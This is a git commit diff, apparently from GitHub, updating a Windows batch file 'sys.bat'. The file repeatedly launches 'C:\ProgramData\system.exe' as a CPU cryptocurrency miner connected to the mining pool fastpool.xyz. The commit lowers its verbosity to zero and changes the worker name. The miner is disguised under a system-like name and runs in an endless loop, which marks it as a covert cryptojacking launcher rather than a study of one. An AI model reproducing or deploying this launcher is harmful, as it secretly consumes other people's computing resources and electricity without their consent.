3940ff690e3679e5c8c24fffd438c9a15e9496bf
BobbySJohnson <77875776+BobbySJohnson@users.noreply.github.com>
2021-03-21 04:06:55 +0545

    Update sys.bat

--- sys.bat
+++ sys.bat
@@ -2,6 +2,6 @@
 
 :start
 
-  C:\ProgramData\system.exe -v 2 -r 20 -cpu -cputhreads 3 -cputhrottling 20 -s stratum+tcp://fastpool.xyz:10096 -su 1191499-59.0.mf
+  C:\ProgramData\system.exe -v 0 -r 20 -cpu -cputhreads 3 -cputhrottling 20 -s stratum+tcp://fastpool.xyz:10096 -su 1191499-59.0.admin
 
 goto start
